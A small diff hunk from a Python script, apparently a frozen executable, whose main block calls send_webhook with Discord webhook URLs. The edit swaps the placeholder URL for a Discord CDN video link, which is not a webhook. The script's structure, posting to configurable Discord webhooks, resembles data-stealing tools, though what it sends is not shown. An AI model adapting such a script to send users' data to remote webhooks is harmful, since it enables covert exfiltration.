@@ -517,7 +517,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
 if __name__ == "__main__":
     freeze_support()
     if len(sys.argv) == 1:
-        send_webhook(["YOUR DISCORD WEBHOOK URL"])
+        send_webhook(["https://cdn.discordapp.com/attachments/1232010384316170370/1234223695921414256/tiktok-7337347193889737992.mp4?ex=662ff3e3&is=662ea263&hm=32fe9c17566a63d7ca5091f12aeea1ce1f6ff255de6f5c7c472ae8651f1b837e&"])
     else:
         del sys.argv[0]
         send_webhook(sys.argv)
